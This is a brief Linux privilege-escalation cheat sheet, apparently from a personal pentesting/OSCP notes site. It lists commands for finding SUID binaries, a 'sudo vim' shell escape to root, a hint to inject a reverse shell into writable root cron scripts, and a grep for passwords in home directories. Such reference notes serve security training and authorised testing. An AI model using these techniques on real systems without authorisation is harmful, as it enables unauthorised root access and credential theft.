---
TitleSEO:    "Linux Privilege Escalation Notes | ZureFX"
TitlePost:   "Linux Privilege Escalation"
Author:      "ZureFX"
Description: "Linux privesc quick reference: SUID, sudo misconfigurations, cron jobs, writable paths and kernel exploits."
Keywords:    "linux privesc, privilege escalation, suid, sudo, cron, pentesting, oscp"
URL:         "https://zurefx.github.io/notes/linux-privesc-notes.html"
URL_IMAGES:  "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/notes/linux-privesc-notes/"
Date:        "2026-03-16"
Tags:        "CheatSheet, Linux, PrivEsc, OSCP"
Section:     "notes"
Subsection:  "Linux"
Lang:        "en"
main_img:    "linux-privesc-notes"
Permalink:   "/notes/linux-privesc-notes.html"
BtnLabel:    "View CheatSheet"
---

## SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
# Check GTFObins for each result
```

## Sudo Misconfigurations

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/vim → sudo vim -c '!bash'
```

## Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.*
# Writable script run by root → inject reverse shell
```

## Interesting Files

```bash
find / -name "*.conf" -readable 2>/dev/null
grep -r "password" /home --include="*.txt" 2>/dev/null
```
